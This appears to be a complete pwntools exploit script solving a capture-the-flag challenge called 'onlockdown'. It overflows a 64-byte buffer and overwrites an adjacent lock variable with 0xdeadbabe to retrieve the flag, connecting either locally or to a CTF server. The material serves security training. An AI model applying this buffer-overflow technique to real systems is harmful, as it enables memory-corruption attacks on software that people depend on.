from pwn import *

if 'rem' in sys.argv:
    conn = remote('ctf.umbccd.io', 4500)
else:
    conn = process('./onlockdown')

for i in range(2):
    print(conn.recvline().decode())

conn.send(bytes(64)) ## if we overwrite the first 64 bytes of the buffer, we can write data to lock.

conn.send(bytes.fromhex('deadbabe') + b'\n') ## then, we overwrite the lock with 0xdeadbabe and send out a line break to
print(conn.recvline().decode()) ## get that flag!
